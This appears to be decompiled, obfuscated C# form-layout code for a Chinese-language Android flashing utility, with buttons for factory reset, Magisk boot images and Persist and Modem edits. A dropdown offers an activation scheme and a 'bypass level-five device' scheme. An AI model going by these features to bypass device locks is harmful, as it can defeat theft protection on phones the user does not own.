		((Control)this.m_103).Controls.Add((Control)this.m_104);
		((TabPage)this.m_103).Location = new Point(4, 26);
		((Control)this.m_103).Name = "tabPage8";
		((Control)this.m_103).Size = new Size(464, 149);
		((TabPage)this.m_103).TabIndex = 1;
		((Control)this.m_103).Text = "Factory reset";
		((TabPage)this.m_103).UseVisualStyleBackColor = true;
		((Control)this.m_104).Controls.Add((Control)this.m_105);
		((Control)this.m_104).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_104).ForeColor = Color.LightSkyBlue;
		((Control)this.m_104).Location = new Point(62, 29);
		((Control)this.m_104).Name = "groupBox6";
		((Control)this.m_104).Size = new Size(330, 90);
		((Control)this.m_104).TabIndex = 40;
		((GroupBox)this.m_104).TabStop = false;
		((Control)this.m_104).Text = "恢复";
		((Control)this.m_105).Cursor = Cursors.Hand;
		((UIButton)this.m_105).FillColor = Color.LightSkyBlue;
		((Control)this.m_105).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_105).Location = new Point(56, 34);
		((Control)this.m_105).MinimumSize = new Size(1, 1);
		((Control)this.m_105).Name = "uiSymbolButton5";
		((UIButton)this.m_105).RectColor = Color.LightSkyBlue;
		((Control)this.m_105).Size = new Size(208, 26);
		((UISymbolButton)this.m_105).Symbol = 61473;
		((UISymbolButton)this.m_105).SymbolSize = 20;
		((Control)this.m_105).TabIndex = 39;
		((Control)this.m_105).Text = "小米助手恢复出厂";
		((UIButton)this.m_105).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_105).Click += _13d;
		((Control)this.m_fa).Cursor = Cursors.Hand;
		((UIButton)this.m_fa).FillColor = Color.LightSkyBlue;
		((Control)this.m_fa).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_fa).Location = new Point(244, 9);
		((Control)this.m_fa).MinimumSize = new Size(1, 1);
		((Control)this.m_fa).Name = "uiButton10";
		((UIButton)this.m_fa).RectColor = Color.LightSkyBlue;
		((Control)this.m_fa).Size = new Size(121, 23);
		((UISymbolButton)this.m_fa).Symbol = 362299;
		((UISymbolButton)this.m_fa).SymbolSize = 20;
		((Control)this.m_fa).TabIndex = 46;
		((Control)this.m_fa).Text = "Rec升级";
		((UIButton)this.m_fa).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_fa).Click += _120;
		((Control)this.m_ef).Cursor = Cursors.Hand;
		((UIButton)this.m_ef).FillColor = Color.LightSkyBlue;
		((Control)this.m_ef).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ef).Location = new Point(117, 9);
		((Control)this.m_ef).MinimumSize = new Size(1, 1);
		((Control)this.m_ef).Name = "uiButton7";
		((UIButton)this.m_ef).RectColor = Color.LightSkyBlue;
		((Control)this.m_ef).Size = new Size(119, 23);
		((UISymbolButton)this.m_ef).Symbol = 61717;
		((UISymbolButton)this.m_ef).SymbolSize = 20;
		((Control)this.m_ef).TabIndex = 39;
		((Control)this.m_ef).Text = "刷入卡刷包";
		((UIButton)this.m_ef).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ef).Click += _10c;
		((Control)this.m_ee).Cursor = Cursors.Hand;
		((UIButton)this.m_ee).FillColor = Color.LightSkyBlue;
		((Control)this.m_ee).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ee).Location = new Point(8, 8);
		((Control)this.m_ee).MinimumSize = new Size(1, 1);
		((Control)this.m_ee).Name = "uiButton8";
		((UIButton)this.m_ee).RectColor = Color.LightSkyBlue;
		((Control)this.m_ee).Size = new Size(103, 23);
		((UISymbolButton)this.m_ee).Symbol = 558148;
		((UISymbolButton)this.m_ee).SymbolSize = 20;
		((Control)this.m_ee).TabIndex = 38;
		((Control)this.m_ee).Text = "读设备信息";
		((UIButton)this.m_ee).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ee).Click += _10e;
		((Control)this.m_ea).Cursor = Cursors.Hand;
		((UIButton)this.m_ea).FillColor = Color.LightSkyBlue;
		((Control)this.m_ea).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ea).Location = new Point(386, 39);
		((Control)this.m_ea).MinimumSize = new Size(1, 1);
		((Control)this.m_ea).Name = "uiSymbolButton2";
		((UIControl)this.m_ea).Radius = 8;
		((UIButton)this.m_ea).RectColor = Color.LightSkyBlue;
		((Control)this.m_ea).Size = new Size(89, 23);
		((UISymbolButton)this.m_ea).Symbol = 61563;
		((UISymbolButton)this.m_ea).SymbolSize = 20;
		((Control)this.m_ea).TabIndex = 34;
		((Control)this.m_ea).Text = "阅览";
		((UIButton)this.m_ea).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ea).Click += _137;
		((Control)this.m_d5).Cursor = Cursors.IBeam;
		((Control)this.m_d5).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_d5).Location = new Point(6, 39);
		((Control)this.m_d5).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_d5).MinimumSize = new Size(1, 16);
		((Control)this.m_d5).Name = "uiTextBox1";
		((Control)this.m_d5).Padding = new Padding(5);
		((UIUserControl)this.m_d5).RectColor = Color.Silver;
		((UIPanel)this.m_d5).ShowText = false;
		((Control)this.m_d5).Size = new Size(374, 23);
		((Control)this.m_d5).TabIndex = 12;
		((UIUserControl)this.m_d5).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_d5).Watermark = "RAW";
		((Control)this.m_102).BackColor = Color.Transparent;
		((UIUserControl)this.m_102).FillColor = SystemColors.ButtonHighlight;
		((UIUserControl)this.m_102).FillColor2 = Color.FromArgb(128, 255, 255);
		((UIUserControl)this.m_102).FillDisableColor = Color.FromArgb(243, 249, 255);
		((Control)this.m_102).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_102).ForeColor = Color.FromArgb(192, 192, 0);
		((Control)this.m_102).Location = new Point(30, 38);
		((Control)this.m_102).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_102).MinimumSize = new Size(1, 1);
		((Control)this.m_102).Name = "uiPanel4";
		((UIUserControl)this.m_102).Radius = 10;
		((UIUserControl)this.m_102).RectColor = Color.Silver;
		((Control)this.m_102).Size = new Size(424, 27);
		((Control)this.m_102).TabIndex = 45;
		((Control)this.m_102).Text = "清空日志";
		((UIUserControl)this.m_102).TextAlignment = ContentAlignment.MiddleCenter;
		((Control)this.m_102).Click += _13a;
		((Control)this.m_fb).Controls.Add((Control)fc);
		((Control)this.m_fb).Controls.Add((Control)fd);
		((Control)this.m_fb).Controls.Add((Control)this.m_fe);
		((Control)this.m_fb).Controls.Add((Control)this.m_101);
		((Control)this.m_fb).Controls.Add((Control)this.m_154);
		((Control)this.m_fb).Controls.Add((Control)this.m_15d);
		((Control)this.m_fb).Location = new Point(22, 45);
		((Control)this.m_fb).Name = "tabControl3";
		((TabControl)this.m_fb).SelectedIndex = 0;
		((Control)this.m_fb).Size = new Size(428, 336);
		((Control)this.m_fb).TabIndex = 44;
		((Control)fc).Controls.Add((Control)this.m_dd);
		((TabPage)fc).Location = new Point(4, 26);
		((Control)fc).Name = "tabPage4";
		((Control)fc).Padding = new Padding(3);
		((Control)fc).Size = new Size(420, 306);
		((TabPage)fc).TabIndex = 0;
		((Control)fc).Text = "Drives";
		((TabPage)fc).UseVisualStyleBackColor = true;
		((Control)fd).Controls.Add((Control)this.m_de);
		((TabPage)fd).Location = new Point(4, 26);
		((Control)fd).Name = "tabPage6";
		((Control)fd).Padding = new Padding(3);
		((Control)fd).Size = new Size(420, 306);
		((TabPage)fd).TabIndex = 1;
		((Control)fd).Text = "Payload";
		((TabPage)fd).UseVisualStyleBackColor = true;
		((Control)this.m_fe).Controls.Add((Control)ff);
		((TabPage)this.m_fe).Location = new Point(4, 26);
		((Control)this.m_fe).Name = "tabPage7";
		((Control)this.m_fe).Size = new Size(420, 306);
		((TabPage)this.m_fe).TabIndex = 2;
		((Control)this.m_fe).Text = "Magisk";
		((TabPage)this.m_fe).UseVisualStyleBackColor = true;
		((Control)ff).Controls.Add((Control)this.m_100);
		((Control)ff).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)ff).ForeColor = Color.DodgerBlue;
		((Control)ff).Location = new Point(15, 105);
		((Control)ff).Name = "groupBox10";
		((Control)ff).Size = new Size(386, 89);
		((Control)ff).TabIndex = 9;
		((GroupBox)ff).TabStop = false;
		((Control)ff).Text = "Magisk";
		((Control)this.m_100).Cursor = Cursors.Hand;
		((UIButton)this.m_100).FillColor = Color.LightSkyBlue;
		((Control)this.m_100).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_100).Location = new Point(32, 36);
		((Control)this.m_100).MinimumSize = new Size(1, 1);
		((Control)this.m_100).Name = "uiButton2";
		((UIButton)this.m_100).RectColor = Color.Silver;
		((Control)this.m_100).Size = new Size(324, 24);
		((Control)this.m_100).TabIndex = 0;
		((Control)this.m_100).Text = "制作Boot";
		((UIButton)this.m_100).TipsFont = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_100).Click += f2;
		((Control)this.m_101).Controls.Add((Control)this.m_f7);
		((TabPage)this.m_101).Location = new Point(4, 26);
		((Control)this.m_101).Name = "tabPage9";
		((Control)this.m_101).Size = new Size(420, 306);
		((TabPage)this.m_101).TabIndex = 4;
		((Control)this.m_101).Text = "ACC Hex";
		((TabPage)this.m_101).UseVisualStyleBackColor = true;
		((Control)this.m_f7).Controls.Add((Control)this.m_f6);
		((Control)this.m_f7).Controls.Add((Control)this.m_f5);
		((Control)this.m_f7).ForeColor = Color.DodgerBlue;
		((Control)this.m_f7).Location = new Point(16, 89);
		((Control)this.m_f7).Name = "groupBox4";
		((Control)this.m_f7).Size = new Size(386, 120);
		((Control)this.m_f7).TabIndex = 43;
		((GroupBox)this.m_f7).TabStop = false;
		((Control)this.m_f7).Text = "Hex ACC";
		((Control)this.m_f6).Cursor = Cursors.Hand;
		((UIButton)this.m_f6).FillColor = Color.LightSkyBlue;
		((Control)this.m_f6).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f6).Location = new Point(31, 75);
		((Control)this.m_f6).MinimumSize = new Size(1, 1);
		((Control)this.m_f6).Name = "uiSymbolButton4";
		((UIButton)this.m_f6).RectColor = Color.LightSkyBlue;
		((Control)this.m_f6).Size = new Size(324, 24);
		((UISymbolButton)this.m_f6).Symbol = 61787;
		((UISymbolButton)this.m_f6).SymbolSize = 20;
		((Control)this.m_f6).TabIndex = 42;
		((Control)this.m_f6).Text = "修改Modem";
		((UIButton)this.m_f6).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f6).Click += _130;
		((Control)this.m_f5).Cursor = Cursors.Hand;
		((UIButton)this.m_f5).FillColor = Color.LightSkyBlue;
		((Control)this.m_f5).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f5).Location = new Point(31, 29);
		((Control)this.m_f5).MinimumSize = new Size(1, 1);
		((Control)this.m_f5).Name = "uiSymbolButton3";
		((UIButton)this.m_f5).RectColor = Color.LightSkyBlue;
		((Control)this.m_f5).Size = new Size(324, 24);
		((UISymbolButton)this.m_f5).Symbol = 61462;
		((UISymbolButton)this.m_f5).SymbolSize = 20;
		((Control)this.m_f5).TabIndex = 41;
		((Control)this.m_f5).Text = "修改Persist";
		((UIButton)this.m_f5).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_f5).Click += _12e;
		((Control)this.m_154).Controls.Add((Control)this.m_155);
		((TabPage)this.m_154).Location = new Point(4, 26);
		((Control)this.m_154).Name = "tabPage2";
		((Control)this.m_154).Padding = new Padding(3);
		((Control)this.m_154).Size = new Size(420, 306);
		((TabPage)this.m_154).TabIndex = 5;
		((Control)this.m_154).Text = "Make Cust";
		((TabPage)this.m_154).UseVisualStyleBackColor = true;
		((Control)this.m_155).Controls.Add((Control)this.m_15c);
		((Control)this.m_155).Controls.Add((Control)this.m_15b);
		((Control)this.m_155).Controls.Add((Control)this.m_15a);
		((Control)this.m_155).Controls.Add((Control)this.m_158);
		((Control)this.m_155).Controls.Add((Control)this.m_159);
		((Control)this.m_155).Controls.Add((Control)this.m_156);
		((Control)this.m_155).ForeColor = Color.DodgerBlue;
		((Control)this.m_155).Location = new Point(19, 40);
		((Control)this.m_155).Name = "groupBox11";
		((Control)this.m_155).Size = new Size(386, 212);
		((Control)this.m_155).TabIndex = 44;
		((GroupBox)this.m_155).TabStop = false;
		((Control)this.m_155).Text = "Cust Make";
		((Control)this.m_15c).Cursor = Cursors.Hand;
		((UIButton)this.m_15c).FillColor = Color.LightSkyBlue;
		((Control)this.m_15c).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_15c).Location = new Point(25, 158);
		((Control)this.m_15c).MinimumSize = new Size(1, 1);
		((Control)this.m_15c).Name = "uiSymbolButton10";
		((UIButton)this.m_15c).RectColor = Color.LightSkyBlue;
		((Control)this.m_15c).Size = new Size(324, 24);
		((UISymbolButton)this.m_15c).Symbol = 61787;
		((UISymbolButton)this.m_15c).SymbolSize = 20;
		((Control)this.m_15c).TabIndex = 78;
		((Control)this.m_15c).Text = "修改MTK scatter";
		((UIButton)this.m_15c).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_15c).Click += _19e;
		((UITextBox)this.m_15b).ButtonSymbol = 557677;
		((Control)this.m_15b).Cursor = Cursors.Default;
		((Control)this.m_15b).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_15b).Location = new Point(27, 36);
		((Control)this.m_15b).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_15b).MinimumSize = new Size(1, 16);
		((Control)this.m_15b).Name = "Blobtext";
		((Control)this.m_15b).Padding = new Padding(5);
		((UIUserControl)this.m_15b).RectColor = Color.FromArgb(224, 224, 224);
		((UITextBox)this.m_15b).ShowButton = true;
		((UIPanel)this.m_15b).ShowText = false;
		((Control)this.m_15b).Size = new Size(185, 29);
		((Control)this.m_15b).TabIndex = 77;
		((UIUserControl)this.m_15b).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_15b).Watermark = "序列号 fb/adb devices";
		((UITextBox)this.m_15b).ButtonClick += _197;
		((Radio)this.m_15a).AutoCheck = true;
		((Control)this.m_15a).Location = new Point(281, 40);
		((Control)this.m_15a).Name = "EROFSChe";
		((Control)this.m_15a).Size = new Size(70, 22);
		((Control)this.m_15a).TabIndex = 47;
		((Control)this.m_15a).Text = "EROFS";
		((Radio)this.m_15a).CheckedChanged += _196;
		((Radio)this.m_158).AutoCheck = true;
		((Radio)this.m_158).Checked = true;
		((Control)this.m_158).Location = new Point(219, 40);
		((Control)this.m_158).Name = "EXT4Chek";
		((Control)this.m_158).Size = new Size(76, 22);
		((Control)this.m_158).TabIndex = 46;
		((Control)this.m_158).Text = "EXT4";
		((Select)this.m_159).Items.AddRange(new object[2] { "激活设备方案-需搭配修改Persist", "绕过五级设备方案-强制修改系统版本" });
		((Select)this.m_159).List = true;
		((Control)this.m_159).Location = new Point(27, 71);
		((Control)this.m_159).Name = "select2";
		((Select)this.m_159).SelectedIndex = 0;
		((Select)this.m_159).SelectedValue = "激活设备方案-需搭配修改Persist";
		((Control)this.m_159).Size = new Size(324, 37);
		((Control)this.m_159).TabIndex = 45;
		((Control)this.m_159).Text = "激活设备方案-需搭配修改Persist";
		((Control)this.m_156).Cursor = Cursors.Hand;
		((UIButton)this.m_156).FillColor = Color.LightSkyBlue;
		((Control)this.m_156).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_156).Location = new Point(27, 117);
		((Control)this.m_156).MinimumSize = new Size(1, 1);
		((Control)this.m_156).Name = "uiSymbolButton12";
		((UIButton)this.m_156).RectColor = Color.LightSkyBlue;
		((Control)this.m_156).Size = new Size(324, 24);
		((UISymbolButton)this.m_156).Symbol = 61462;
		((UISymbolButton)this.m_156).SymbolSize = 20;
		((Control)this.m_156).TabIndex = 41;
		((Control)this.m_156).Text = "制作";
		((UIButton)this.m_156).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_156).Click += _19d;
		((Control)this.m_15d).Controls.Add((Control)this.m_15e);
		((TabPage)this.m_15d).Location = new Point(4, 26);
		((Control)this.m_15d).Name = "tabPage5";
		((Control)this.m_15d).Padding = new Padding(3);
		((Control)this.m_15d).Size = new Size(420, 306);
		((TabPage)this.m_15d).TabIndex = 6;
		((Control)this.m_15d).Text = "Super Make";
		((TabPage)this.m_15d).UseVisualStyleBackColor = true;
		((Control)this.m_15e).Controls.Add((Control)this.m_161);
		((Control)this.m_15e).Controls.Add((Control)this.m_15f);
		((Control)this.m_15e).Controls.Add((Control)_160);
		((Control)this.m_15e).ForeColor = Color.DodgerBlue;
		((Control)this.m_15e).Location = new Point(17, 63);
		((Control)this.m_15e).Name = "groupBox12";
		((Control)this.m_15e).Size = new Size(386, 143);
		((Control)this.m_15e).TabIndex = 45;
		((GroupBox)this.m_15e).TabStop = false;
		((Control)this.m_15e).Text = "SUper";
		((Checkbox)this.m_161).AutoCheck = true;
		((Control)this.m_161).Location = new Point(20, 29);
		((Control)this.m_161).Name = "delsuper";
		((Control)this.m_161).Size = new Size(133, 21);
		((Control)this.m_161).TabIndex = 79;
		((Control)this.m_161).Text = "删除散包分段文件";
		((Control)this.m_15f).Cursor = Cursors.Hand;
		((UIButton)this.m_15f).FillColor = Color.LightSkyBlue;
		((Control)this.m_15f).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_15f).Location = new Point(25, 96);
		((Control)this.m_15f).MinimumSize = new Size(1, 1);
		((Control)this.m_15f).Name = "uiSymbolButton13";
		((UIButton)this.m_15f).RectColor = Color.LightSkyBlue;
		((Control)this.m_15f).Size = new Size(324, 24);
		((UISymbolButton)this.m_15f).Symbol = 61787;
		((UISymbolButton)this.m_15f).SymbolSize = 20;
		((Control)this.m_15f).TabIndex = 78;
		((Control)this.m_15f).Text = "合并OFP Super分段";
		((UIButton)this.m_15f).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_15f).Click += _1a4;
		((Control)_160).Cursor = Cursors.Hand;
		((UIButton)_160).FillColor = Color.LightSkyBlue;
		((Control)_160).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)_160).Location = new Point(25, 56);
		((Control)_160).MinimumSize = new Size(1, 1);
		((Control)_160).Name = "metasuper";
		((UIButton)_160).RectColor = Color.LightSkyBlue;
		((Control)_160).Size = new Size(324, 24);
		((UISymbolButton)_160).Symbol = 61462;
		((UISymbolButton)_160).SymbolSize = 20;
		((Control)_160).TabIndex = 41;
		((Control)_160).Text = "散包合并Super";
		((UIButton)_160).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)_160).Click += _1a3;
		((Control)this.m_e5).Controls.Add((Control)this.m_10e);
		((Control)this.m_e5).Controls.Add((Control)this.m_cd);
		((Control)this.m_e5).Controls.Add((Control)this.m_10b);
		((Control)this.m_e5).Controls.Add((Control)this.m_107);
		((Control)this.m_e5).Controls.Add((Control)this.m_bf);
		((Control)this.m_e5).Controls.Add((Control)this.m_106);
		((Control)this.m_e5).Controls.Add((Control)this.m_e6);
		((Control)this.m_e5).Controls.Add((Control)this.m_b5);
		((Control)this.m_e5).Controls.Add((Control)this.m_92);
		((Control)this.m_e5).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e5).ForeColor = Color.LightSkyBlue;
		((Control)this.m_e5).Location = new Point(489, 515);
		((Control)this.m_e5).Name = "groupBox8";
		((Control)this.m_e5).Size = new Size(453, 122);
		((Control)this.m_e5).TabIndex = 51;
		((GroupBox)this.m_e5).TabStop = false;
		((Control)this.m_e5).Text = "信息";
		((Control)this.m_10e).AutoSize = true;
		((Control)this.m_10e).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_10e).ForeColor = Color.DodgerBlue;
		((Control)this.m_10e).Location = new Point(193, 25);
		((Control)this.m_10e).Name = "label9";
		((Control)this.m_10e).Size = new Size(44, 17);
		((Control)this.m_10e).TabIndex = 48;
		((Control)this.m_10e).Text = "总写入";
		((Control)this.m_10b).AutoSize = true;
		((Control)this.m_10b).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_10b).ForeColor = Color.DodgerBlue;
		((Control)this.m_10b).Location = new Point(324, 22);
		((Control)this.m_10b).Name = "label8";
		((Control)this.m_10b).Size = new Size(59, 17);
		((Control)this.m_10b).TabIndex = 47;
		((Control)this.m_10b).Text = "会员等级:";
		((Control)this.m_107).AutoSize = true;
		((Control)this.m_107).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_107).ForeColor = Color.DodgerBlue;
		((Control)this.m_107).Location = new Point(183, 88);
		((Control)this.m_107).Name = "label5";
		((Control)this.m_107).Size = new Size(32, 17);
		((Control)this.m_107).TabIndex = 46;
		((Control)this.m_107).Text = "耗时";
		((Control)this.m_106).AutoSize = true;
		((Control)this.m_106).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_106).ForeColor = Color.DodgerBlue;
		((Control)this.m_106).Location = new Point(9, 87);
		((Control)this.m_106).Name = "label3";
		((Control)this.m_106).Size = new Size(38, 17);
		((Control)this.m_106).TabIndex = 45;
		((Control)this.m_106).Text = "User:";
		((Control)this.m_e6).BackColor = Color.Transparent;
		((Control)this.m_e6).Controls.Add((Control)this.m_124);
		((Control)this.m_e6).Controls.Add((Control)this.m_cf);
		((UIUserControl)this.m_e6).FillColor = Color.Transparent;
		((UIUserControl)this.m_e6).FillDisableColor = Color.FromArgb(243, 249, 255);
		((Control)this.m_e6).Font = new Font("宋体", 12f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e6).Location = new Point(4, 49);
		((Control)this.m_e6).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_e6).MinimumSize = new Size(1, 1);
		((Control)this.m_e6).Name = "uiPanel1";
		((UIUserControl)this.m_e6).Radius = 10;
		((UIUserControl)this.m_e6).RectColor = Color.Silver;
		((Control)this.m_e6).Size = new Size(442, 28);
		((Control)this.m_e6).TabIndex = 0;
		((Control)this.m_e6).Text = null;
		((UIUserControl)this.m_e6).TextAlignment = ContentAlignment.MiddleCenter;
		((Control)this.m_124).AutoSize = true;
		((Control)this.m_124).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_124).ForeColor = Color.DodgerBlue;
		((Control)this.m_124).Location = new Point(365, 5);
		((Control)this.m_124).Name = "label10";
		((Control)this.m_124).Size = new Size(44, 17);
		((Control)this.m_124).TabIndex = 49;
		((Control)this.m_124).Text = "总大小";
		((Control)this.m_e7).Cursor = Cursors.Hand;
		((UIButton)this.m_e7).FillColor = Color.FromArgb(243, 249, 255);
		((UIButton)this.m_e7).FillColor2 = Color.FromArgb(243, 249, 255);
		((UIButton)this.m_e7).FillHoverColor = Color.FromArgb(255, 128, 128);
		((UIButton)this.m_e7).FillPressColor = Color.Red;
		((Control)this.m_e7).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e7).ForeColor = Color.Red;
		((Control)this.m_e7).Location = new Point(851, 643);
		((Control)this.m_e7).MinimumSize = new Size(1, 1);
		((Control)this.m_e7).Name = "uiSymbolButton1";
		((UIButton)this.m_e7).RectPressColor = Color.Red;
		((Control)this.m_e7).Size = new Size(91, 28);
		((UISymbolButton)this.m_e7).Symbol = 61526;
		((UISymbolButton)this.m_e7).SymbolColor = Color.Red;
		((UISymbolButton)this.m_e7).SymbolSize = 20;
		((Control)this.m_e7).TabIndex = 39;
		((Control)this.m_e7).Text = "停止";
		((UIButton)this.m_e7).TipsFont = new Font("微软雅黑", 7.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((UIButton)this.m_e7).TipsForeColor = Color.Transparent;
		((Control)this.m_e7).Click += _139;
		((System.Windows.Forms.Timer)this.m_dc).Interval = 500;
		((System.Windows.Forms.Timer)this.m_dc).Tick += _11c;
		((System.Windows.Forms.Timer)this.m_e4).Interval = 500;
		((System.Windows.Forms.Timer)this.m_e4).Tick += _15e;
		((Control)this.m_e8).BackColor = Color.Transparent;
		((Control)this.m_e8).Controls.Add((Control)this.m_126);
		((Control)this.m_e8).Controls.Add((Control)this.m_cc);
		((Control)this.m_e8).Controls.Add((Control)this.m_c7);
		((Control)this.m_e8).Controls.Add((Control)this.m_d9);
		((Control)this.m_e8).Controls.Add((Control)this.m_da);
		((UIUserControl)this.m_e8).FillColor = Color.Transparent;
		((UIUserControl)this.m_e8).FillDisableColor = Color.FromArgb(243, 249, 255);
		((Control)this.m_e8).Font = new Font("宋体", 12f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e8).Location = new Point(6, 16);
		((Control)this.m_e8).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_e8).MinimumSize = new Size(1, 1);
		((Control)this.m_e8).Name = "uiPanel3";
		((UIUserControl)this.m_e8).Radius = 10;
		((UIUserControl)this.m_e8).RectColor = Color.Silver;
		((Control)this.m_e8).Size = new Size(452, 27);
		((Control)this.m_e8).TabIndex = 53;
		((Control)this.m_e8).Text = null;
		((UIUserControl)this.m_e8).TextAlignment = ContentAlignment.MiddleCenter;
		((UIComboBox)this.m_126).DataSource = null;
		((UIUserControl)this.m_126).FillColor = Color.White;
		((Control)this.m_126).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_126).ForeColor = Color.DodgerBlue;
		((UIComboBox)this.m_126).ItemHoverColor = Color.FromArgb(155, 200, 255);
		((UIComboBox)this.m_126).ItemSelectForeColor = Color.FromArgb(235, 243, 255);
		((Control)this.m_126).Location = new Point(5, 2);
		((Control)this.m_126).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_126).MinimumSize = new Size(63, 0);
		((Control)this.m_126).Name = "textBox2";
		((Control)this.m_126).Padding = new Padding(0, 0, 30, 2);
		((UIUserControl)this.m_126).RectColor = Color.Silver;
		((Control)this.m_126).Size = new Size(97, 23);
		((UIDropControl)this.m_126).SymbolSize = 24;
		((Control)this.m_126).TabIndex = 58;
		((UIUserControl)this.m_126).TextAlignment = ContentAlignment.MiddleLeft;
		((UIDropControl)this.m_126).Watermark = "";
		((Control)this.m_e9).Controls.Add((Control)this.m_e8);
		((Control)this.m_e9).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_e9).ForeColor = Color.LightSkyBlue;
		((Control)this.m_e9).Location = new Point(8, 3);
		((Control)this.m_e9).Name = "groupBox13";
		((Control)this.m_e9).Size = new Size(465, 49);
		((Control)this.m_e9).TabIndex = 54;
		((GroupBox)this.m_e9).TabStop = false;
		((Control)this.m_e9).Text = "端口";
		((UIComboBox)this.m_10a).DataSource = null;
		((UIDropControl)this.m_10a).DropDownStyle = (UIDropDownStyle)1;
		((UIUserControl)this.m_10a).FillColor = Color.White;
		((Control)this.m_10a).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_10a).ForeColor = Color.DodgerBlue;
		((UIComboBox)this.m_10a).ItemHoverColor = Color.FromArgb(155, 200, 255);
		((UIComboBox)this.m_10a).ItemSelectForeColor = Color.FromArgb(235, 243, 255);
		((Control)this.m_10a).Location = new Point(9, 62);
		((Control)this.m_10a).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_10a).MinimumSize = new Size(63, 0);
		((Control)this.m_10a).Name = "comboBox2";
		((Control)this.m_10a).Padding = new Padding(0, 0, 30, 2);
		((UIUserControl)this.m_10a).RectColor = Color.Silver;
		((Control)this.m_10a).Size = new Size(466, 24);
		((UIDropControl)this.m_10a).SymbolSize = 24;
		((Control)this.m_10a).TabIndex = 35;
		((UIUserControl)this.m_10a).TextAlignment = ContentAlignment.MiddleLeft;
		((UIDropControl)this.m_10a).Watermark = "";
		((UIComboBox)this.m_10a).SelectedIndexChanged += f6;
		((Checkbox)this.m_109).AutoCheck = true;
		((Control)this.m_109).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_109).Location = new Point(80, 470);
		((Control)this.m_109).Name = "checkBox2";
		((Control)this.m_109).Size = new Size(90, 32);
		((Control)this.m_109).TabIndex = 59;
		((Control)this.m_109).Text = "不发引导";
		((Checkbox)this.m_108).AutoCheck = true;
